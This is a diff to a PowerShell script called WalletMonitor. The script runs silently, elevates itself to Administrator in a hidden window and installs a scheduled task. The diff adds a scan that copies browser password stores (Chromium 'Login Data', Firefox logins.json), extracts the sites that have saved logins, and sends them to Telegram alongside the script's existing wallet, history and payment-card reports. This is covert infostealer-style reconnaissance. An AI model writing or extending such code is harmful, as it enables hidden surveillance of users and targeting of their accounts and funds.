@@ -46,6 +46,7 @@ param(
     [switch]$ResetState,
     [switch]$HistoryReport,
     [switch]$CardReport,
+    [switch]$LoginReport,
     [switch]$Elevate,
     [switch]$Install,
     [switch]$Uninstall,
@@ -61,7 +62,7 @@ try {
 } catch { }
 
 # ---- Silent mode: no screen output except with -Console or admin commands ----
-$Script:ConsoleMode = [bool]($Console -or $Install -or $Uninstall -or $TaskStatus -or $TestNotify -or $HistoryReport -or $CardReport -or $Elevate -or $Help)
+$Script:ConsoleMode = [bool]($Console -or $Install -or $Uninstall -or $TaskStatus -or $TestNotify -or $HistoryReport -or $CardReport -or $LoginReport -or $Elevate -or $Help)
 if (-not $Script:ConsoleMode) { $ErrorActionPreference = 'SilentlyContinue' }
 
 # =====================================================================
@@ -151,6 +152,14 @@ $CONFIG = @{
         enabled          = $true
         count_only       = $true      # Mandatory: count-only; no card number/name is read and no decryption is performed
         notify_on_change = $true      # Telegram notification only when the counts change
+    }
+
+    # ---- Sites stored in the browsers' saved passwords (URLs only - no passwords) ----
+    saved_logins = @{
+        enabled          = $true
+        url_only         = $true      # Mandatory: only origin_url / hostname is read; no username and no password
+        notify_on_change = $true      # Telegram notification only when the set of sites changes
+        max_urls         = 120        # Maximum number of site URLs listed in one report
     }
 
     host_label = ''
@@ -267,6 +276,7 @@ $Script:NewHistoryCount = 0
 $Script:HistoryStats = @()
 $Script:HistoryBrowsers = 0
 $Script:CardStats = @()
+$Script:LoginStats = @()
 
 # =====================================================================
 #  4)  General helper functions
@@ -519,6 +529,7 @@ function Initialize-State {
         last_summary_date = ''
         last_report_ts   = ''
         card_sig         = ''
+        login_sigs       = @()
         seen             = @()
         daily            = @()
     }
@@ -534,6 +545,8 @@ function Initialize-State {
 
     $Script:State.seen  = [System.Collections.ArrayList]@(@($Script:State.seen)  | Where-Object { $_ -and $_.key })
     $Script:State.daily = [System.Collections.ArrayList]@(@($Script:State.daily) | Where-Object { $_ -and $_.date })
+    # Add-Member -Force also creates the property on a state.json written by an older version.
+    $Script:State | Add-Member -NotePropertyName login_sigs -NotePropertyValue ([System.Collections.ArrayList]@(@($Script:State.login_sigs) | Where-Object { $_ -and $_.user })) -Force
 
     $Script:SeenSet = New-Object 'System.Collections.Generic.HashSet[string]' ([System.StringComparer]::Ordinal)
     foreach ($s in @($Script:State.seen)) {
@@ -1660,7 +1673,7 @@ function Build-CardReportLines {
 
     [void]$lines.Add('💳 <b>Saved payment cards — WalletMonitor</b>')
     [void]$lines.Add('━━━━━━━━━━━━━━━━')
-    [void]$lines.Add("🖥 Host: <code>$(ConvertTo-HtmlSafe $Script:HostLabel)</code> · 👤 $([System.Environment]::UserName)")
+    [void]$lines.Add("🖥 Host: <code>$(ConvertTo-HtmlSafe $Script:HostLabel)</code> · 👤 $([string]$env:USERNAME)")
     [void]$lines.Add("🕒 Report time: $ts")
     [void]$lines.Add('🔒 <i>Count-only — no card number or name is extracted, stored, or sent, and no encryption is decrypted.</i>')
 
@@ -1720,6 +1733,255 @@ function Send-CardReport {
     }
     if ($sentAll) { Write-Log "Card report sent ($total message(s))." }
     else { Write-Log 'Failed to send part of the card report.' 'ERROR' }
+}
+
+# =====================================================================
+#  12.7)  Check 4-C: saved logins -> site URLs only (no passwords)
+#        - Chromium/Edge/Brave/Vivaldi/Opera/Chromium: "Login Data" -> logins table, origin_url only
+#        - Firefox: logins.json -> the "hostname" keys only
+#        - No username, no password and no encrypted blob is read, decrypted or stored.
+# =====================================================================
+
+function New-LoginStat {
+    param([string]$Browser, [string]$Profile, [int]$Logins, [string]$Source)
+    return [PSCustomObject]@{
+        Browser = $Browser
+        Profile = $Profile
+        Logins  = $Logins
+        Source  = $Source
+    }
+}
+
+function Get-LoginUrlsFromSqlite {
+    <# Reads only the origin_url column of the logins table. Nothing else is touched:
+       no username_value, no password_value and no encrypted blob is read, copied or decrypted. #>
+    param([string]$DbPath, [string]$TmpDir)
+    $result = @{ Logins = 0; Urls = @(); HasTable = $false }
+    if (-not (Test-Path -LiteralPath $DbPath)) { return $result }
+    if ([string]::IsNullOrWhiteSpace($TmpDir)) { $TmpDir = New-TempDir }
+    $tmp = Join-Path $TmpDir ("logins_" + [guid]::NewGuid().ToString('N') + ".db")
+    try {
+        Copy-LockedFile -Source $DbPath -Dest $tmp
+        $info = Get-SqliteInfo -Path $tmp -Table 'logins'
+        if ($info.RootPage -eq 0) { return $result }
+        $result.HasTable = $true
+        $result.Logins = [int](Get-SqliteRowCount $info.Bytes $info.RootPage $info.PageSize $info.Usable $info.TotalPages)
+        if ($result.Logins -le 0) { return $result }
+        $urls = New-Object System.Collections.ArrayList
+        foreach ($u in @(Get-SqliteColumnValues -Path $tmp -Table 'logins' -Column 'origin_url')) {
+            if (-not [string]::IsNullOrWhiteSpace($u)) { [void]$urls.Add([string]$u) }
+        }
+        $result.Urls = @($urls)
+    } finally {
+        if (Test-Path -LiteralPath $tmp) { Remove-Item -LiteralPath $tmp -Force -ErrorAction SilentlyContinue }
+    }
+    return $result
+}
+
+function Get-FirefoxLoginUrls {
+    <# Reads only the "hostname" JSON keys from logins.json.
+       The encrypted username/password fields are never parsed or decrypted. #>
+    param([string]$ProfileDir)
+    $result = @{ Logins = 0; Urls = @(); HasTable = $false }
+    $f = Join-Path $ProfileDir 'logins.json'
+    if (-not (Test-Path -LiteralPath $f)) { return $result }
+    try {
+        $raw = [System.IO.File]::ReadAllText($f, [System.Text.Encoding]::UTF8)
+        $m = [regex]::Matches($raw, '"hostname"\s*:\s*"([^"]+)"')
+        $urls = New-Object System.Collections.ArrayList
+        foreach ($x in $m) { [void]$urls.Add($x.Groups[1].Value) }
+        if ($urls.Count -gt 0) {
+            $result.HasTable = $true
+            $result.Logins  = $urls.Count
+            $result.Urls    = @($urls)
+        }
+    } catch { }
+    return $result
+}
+
+function Invoke-BrowserLoginScan {
+    <# Finds the sites stored in each browser's saved passwords and reports the URLs only.
+       Passwords are never read: only the origin_url / hostname column. #>
+    Write-Log 'Scanning saved logins (site URLs only - no passwords)...'
+    $Script:LoginStats = @()
+    $lgCfg = Get-Prop $Script:Cfg 'saved_logins' $null
+    if (-not [bool](Get-Prop $lgCfg 'enabled' $true)) { Write-Log 'Saved-login scanning is disabled in the config.' 'DEBUG'; return }
+
+    $stats  = New-Object System.Collections.ArrayList
+    $errors = New-Object System.Collections.ArrayList
+    $tmpDir = New-TempDir
+    try {
+        # ---------- Chromium family ----------
+        foreach ($br in @(Get-Prop $Script:Cfg 'chromium_browsers' @())) {
+            if (-not [bool](Get-Prop $br 'enabled' $true)) { continue }
+            $name = [string](Get-Prop $br 'name' 'Chromium')
+            $ud = Expand-PathString ([string](Get-Prop $br 'user_data' ''))
+            if (-not $ud -or -not (Test-Path -LiteralPath $ud)) { continue }
+
+            foreach ($prof in @(Get-ChromiumProfiles $ud)) {
+                $ld = Join-Path $prof.FullName 'Login Data'
+                if (-not (Test-Path -LiteralPath $ld)) { continue }
+                try {
+                    $r = Get-LoginUrlsFromSqlite -DbPath $ld -TmpDir $tmpDir
+                    if ($r.Logins -gt 0) {
+                        $st = New-LoginStat -Browser $name -Profile $prof.Name -Logins $r.Logins -Source 'Login Data'
+                        $st | Add-Member -NotePropertyName Urls -NotePropertyValue @($r.Urls) -Force
+                        [void]$stats.Add($st)
+                    }
+                } catch {
+                    [void]$errors.Add("$name/$($prof.Name): $($_.Exception.Message)")
+                }
+            }
+        }
+
+        # ---------- Firefox ----------
+        $ff = Get-Prop $Script:Cfg 'firefox' $null
+        if ([bool](Get-Prop $ff 'enabled' $true)) {
+            $root = Expand-PathString ([string](Get-Prop $ff 'profile_root' ''))
+            if ($root -and (Test-Path -LiteralPath $root)) {
+                foreach ($prof in @(Get-ChildItem -LiteralPath $root -Directory -Force -ErrorAction SilentlyContinue)) {
+                    try {
+                        $r = Get-FirefoxLoginUrls -ProfileDir $prof.FullName
+                        if ($r.Logins -gt 0) {
+                            $st = New-LoginStat -Browser 'Firefox' -Profile $prof.Name -Logins $r.Logins -Source 'logins.json'
+                            $st | Add-Member -NotePropertyName Urls -NotePropertyValue @($r.Urls) -Force
+                            [void]$stats.Add($st)
+                        }
+                    } catch {
+                        [void]$errors.Add("Firefox/$($prof.Name): $($_.Exception.Message)")
+                    }
+                }
+            }
+        }
+    } finally {
+        Remove-Item -LiteralPath $tmpDir -Recurse -Force -ErrorAction SilentlyContinue
+    }
+
+    foreach ($e in $errors) { Add-Error "logins: $e" }
+    $Script:LoginStats = @($stats | Sort-Object Browser, Profile)
+    Write-Log "Profiles with saved logins: $($Script:LoginStats.Count)"
+}
+
+function Get-LoginAggregate {
+    <# Aggregates the login counts per browser (sum of profiles). #>
+    $groups = @{}
+    foreach ($s in @($Script:LoginStats)) {
+        $b = [string]$s.Browser
+        if (-not $groups.ContainsKey($b)) {
+            $groups[$b] = [PSCustomObject]@{ Browser = $b; Logins = 0; Profiles = 0 }
+        }
+        $groups[$b].Logins   = [int]$groups[$b].Logins + [int]$s.Logins
+        $groups[$b].Profiles = [int]$groups[$b].Profiles + 1
+    }
+    return @($groups.Values | Sort-Object Logins -Descending)
+}
+
+function Get-LoginUniqueUrls {
+    <# Unique site URLs across all profiles/browsers (de-duplicated). #>
+    $map = [ordered]@{}
+    foreach ($s in @($Script:LoginStats)) {
+        foreach ($u in @($s.Urls)) {
+            $t = ([string]$u).Trim()
+            if ([string]::IsNullOrWhiteSpace($t)) { continue }
+            $k = Normalize-HistoryUrl $t
+            if ([string]::IsNullOrWhiteSpace($k)) { $k = $t.ToLowerInvariant() }
+            if (-not $map.Contains($k)) { $map[$k] = $t }
+        }
+    }
+    return @($map.Values)
+}
+
+function Get-LoginSignature {
+    <# Fingerprint of the saved-site set, used to detect changes between runs. #>
+    $urls = @(Get-LoginUniqueUrls | Sort-Object)
+    $raw = ($urls -join ';')
+    if ([string]::IsNullOrWhiteSpace($raw)) { $raw = 'no-logins' }
+    return (Get-Sha256Short $raw)
+}
+
+function Build-LoginReportLines {
+    <# Report of the sites kept in the browsers' password stores. URLs only - no credentials. #>
+    param([switch]$Full)
+    $lines  = New-Object System.Collections.ArrayList
+    $agg    = @(Get-LoginAggregate)
+    $urls   = @(Get-LoginUniqueUrls)
+    $total  = 0
+    foreach ($s in @($Script:LoginStats)) { $total += [int]$s.Logins }
+    $ts     = (Get-Date).ToString('yyyy-MM-dd HH:mm')
+    $maxUrls = [int](Get-Prop (Get-Prop $Script:Cfg 'saved_logins') 'max_urls' 120)
+
+    [void]$lines.Add('🔑 <b>Saved logins - site URLs</b>')
+    [void]$lines.Add('━━━━━━━━━━━━━━━━')
+    [void]$lines.Add("🖥 Host: <code>$(ConvertTo-HtmlSafe $Script:HostLabel)</code> · 👤 $([System.Environment]::UserName)")
+    [void]$lines.Add("🕒 Report time: $ts")
+    [void]$lines.Add('🔒 <i>URLs only - no username and no password is read, decrypted, stored or sent.</i>')
+
+    if ($total -eq 0) {
+        [void]$lines.Add('')
+        [void]$lines.Add('ℹ️ No saved logins in any supported browser.')
+        return @($lines)
+    }
+
+    [void]$lines.Add('')
+    [void]$lines.Add("📊 Stored logins: <b>$total</b> · unique sites: <b>$($urls.Count)</b> · profiles: <b>$(@($Script:LoginStats).Count)</b>")
+    [void]$lines.Add('')
+    [void]$lines.Add('🌐 <b>Per browser:</b>')
+    foreach ($g in $agg) {
+        [void]$lines.Add("   • $(ConvertTo-HtmlSafe $g.Browser): logins <b>$($g.Logins)</b> · profiles $($g.Profiles)")
+    }
+
+    [void]$lines.Add('')
+    [void]$lines.Add('━━━━━━━━━━━━━━━━')
+    [void]$lines.Add("🔗 <b>Site URLs from saved passwords</b> - $($urls.Count)")
+    $i = 0
+    foreach ($u in $urls) {
+        if ($i -ge $maxUrls) {
+            $rest = $urls.Count - $maxUrls
+            if ($rest -gt 0) { [void]$lines.Add("   … and $rest more site(s).") }
+            break
+        }
+        $i++
+        $h = Get-UrlHost $u
+        if ([string]::IsNullOrWhiteSpace($h)) { $h = $u }
+        [void]$lines.Add("$i) $(ConvertTo-HtmlSafe $h)")
+        [void]$lines.Add("   🔗 <code>$(ConvertTo-HtmlSafe (Limit-Text $u 160))</code>")
+    }
+
+    if ($Full) {
+        foreach ($g in $agg) {
+            [void]$lines.Add('')
+            [void]$lines.Add('━━━━━━━━━━━━━━━━')
+            [void]$lines.Add("🌐 <b>$(ConvertTo-HtmlSafe $g.Browser)</b> - profile details")
+            foreach ($s in @($Script:LoginStats | Where-Object { $_.Browser -eq $g.Browser })) {
+                [void]$lines.Add("   • $(ConvertTo-HtmlSafe $s.Profile): logins $($s.Logins) · $($s.Source)")
+            }
+        }
+    }
+
+    [void]$lines.Add('')
+    [void]$lines.Add('━━━━━━━━━━━━━━━━')
+    [void]$lines.Add('ℹ️ <i>Chromium (Chrome/Edge/Brave/Vivaldi/Opera/Chromium): only the origin_url column of the logins table is read.')
+    [void]$lines.Add('Firefox: only the hostname keys of logins.json are read. Password values, usernames and encrypted blobs are never read, decrypted or stored.</i>')
+    return @($lines)
+}
+
+function Send-LoginReport {
+    param([switch]$Force, [switch]$Full)
+    $lgCfg = Get-Prop $Script:Cfg 'saved_logins' $null
+    if (-not $Force -and -not [bool](Get-Prop $lgCfg 'notify_on_change' $true)) { return }
+    $maxChars = [int](Get-Prop (Get-Prop (Get-Prop $Script:Cfg 'browser_history') 'report') 'max_message_chars' 3500)
+    $lines = Build-LoginReportLines -Full:$Full
+    if (@($lines).Count -eq 0) { return }
+    $chunks = @(Split-MessageChunks -Lines $lines -MaxChars $maxChars)
+    $total = $chunks.Count
+    $sentAll = $true
+    for ($i = 0; $i -lt $total; $i++) {
+        $prefix = ''
+        if ($total -gt 1) { $prefix = "📄 [$($i + 1)/$total]`n" }
+        if (-not (Send-TelegramMessage -Text ($prefix + $chunks[$i]))) { $sentAll = $false }
+    }
+    if ($sentAll) { Write-Log "Login report sent ($total message(s))." }
+    else { Write-Log 'Failed to send part of the login report.' 'ERROR' }
 }
 
 function Invoke-BrowserHistoryScan {
@@ -2161,7 +2423,7 @@ function Send-NewFindings {
 
     Write-Log "Number of new detections: $($items.Count)"
 
-    $order = @{ 'desktop' = 1; 'extension' = 2; 'file' = 3; 'history' = 4; 'card' = 5 }
+    $order = @{ 'desktop' = 1; 'extension' = 2; 'file' = 3; 'history' = 4; 'card' = 5; 'login' = 6 }
     $items = @($items | Sort-Object @{ Expression = { [int]$order[$_.Type] } }, @{ Expression = { $_.Label } })
 
     $d = @($items | Where-Object { $_.Type -eq 'desktop' }).Count
@@ -2179,7 +2441,9 @@ function Send-NewFindings {
     $head += "🔴 Desktop wallets: $d"
     $head += "🟠 Browser extensions: $x"
     $head += "🔵 File artifacts: $f"
+    $lg = @($items | Where-Object { $_.Type -eq 'login' }).Count
     if ($cd -gt 0) { $head += "💳 Saved cards: change in $cd group(s)" }
+    if ($lg -gt 0) { $head += "🔑 Saved logins: change in $lg group(s)" }
     if ($Script:NewHistoryCount -gt 0) { $head += "🟡 New site visits: $($Script:NewHistoryCount) (shown in the history report)" }
     [void](Send-TelegramMessage -Text ($head -join "`n"))
     $Script:SentCount++
@@ -2428,6 +2692,34 @@ function Invoke-FullScan {
         }
     }
 
+    if ([bool](Get-Prop $scanCfg 'saved_logins' $true)) {
+        try {
+            Invoke-BrowserLoginScan
+            $lgCfg = Get-Prop $Script:Cfg 'saved_logins' $null
+            if ([bool](Get-Prop $lgCfg 'notify_on_change' $true)) {
+                $lsig  = Get-LoginSignature
+                # The scheduled task scans each user profile in its own process, so the fingerprint is
+                # kept per user; otherwise one profile would overwrite the next and cause false alerts.
+                $uNow  = [string]$env:USERNAME
+                if ([string]::IsNullOrWhiteSpace($uNow)) { $uNow = '(unknown)' }
+                $sigArr = [System.Collections.ArrayList]@($Script:State.login_sigs)
+                $lprev = ''
+                foreach ($le in $sigArr) { if ([string]$le.user -eq $uNow) { $lprev = [string]$le.sig; break } }
+                # The first run for a profile records the fingerprint silently; notification only when the set of sites changes.
+                if ($lprev -and $lprev -ne $lsig) {
+                    $lmsg = (Build-LoginReportLines -Full) -join "`n"
+                    [void]$Script:NewItems.Add([PSCustomObject]@{ Type = 'login'; Key = "login|$lsig"; Label = 'Saved logins (changed)'; Message = $lmsg })
+                }
+                $newArr = New-Object System.Collections.ArrayList
+                foreach ($le in $sigArr) { if ([string]$le.user -ne $uNow) { [void]$newArr.Add($le) } }
+                [void]$newArr.Add([PSCustomObject]@{ user = $uNow; sig = $lsig })
+                $Script:State.login_sigs = $newArr
+            }
+        } catch {
+            Add-Error "Login scan failed: $($_.Exception.Message)"; Write-Log $_.Exception.Message 'ERROR'
+        }
+    }
+
     Send-NewFindings
     Send-HistoryReport
     Send-ErrorNotification
@@ -2471,6 +2763,7 @@ if ($Help) {
     Write-Console '  -TestNotify      send a test message to Telegram'
     Write-Console '  -HistoryReport   send the browser history report now'
     Write-Console '  -CardReport      send the saved payment-card report (count-only)'
+    Write-Console '  -LoginReport     send the saved-login site URLs (URLs only, no passwords)'
     Write-Console '  -Elevate         relaunch the tool with Administrator rights silently (hidden window)'
     Write-Console '  -Loop            continuous monitoring loop (per schedule.interval_minutes)'
     Write-Console '  -Install         register a scheduled task that runs as Administrator silently (requires Administrator)'
@@ -2497,6 +2790,7 @@ if ($Elevate -and -not (Test-Admin)) {
             @{ On = $ScanNow;       Arg = '-ScanNow' },
             @{ On = $HistoryReport; Arg = '-HistoryReport' },
             @{ On = $CardReport;    Arg = '-CardReport' },
+            @{ On = $LoginReport;   Arg = '-LoginReport' },
             @{ On = $TestNotify;    Arg = '-TestNotify' },
             @{ On = $Install;       Arg = '-Install' },
             @{ On = $Uninstall;     Arg = '-Uninstall' },
@@ -2565,6 +2859,14 @@ if ($CardReport) {
     Write-Console 'Running the saved payment-card report...'
     try { Invoke-BrowserCardScan } catch { Add-Error "Card scan failed: $($_.Exception.Message)" }
     [void](Send-CardReport -Force -Full)
+    Save-State
+    exit 0
+}
+
+if ($LoginReport) {
+    Write-Console 'Running the saved-login site-URL report...'
+    try { Invoke-BrowserLoginScan } catch { Add-Error "Login scan failed: $($_.Exception.Message)" }
+    [void](Send-LoginReport -Force -Full)
     Save-State
     exit 0
 }
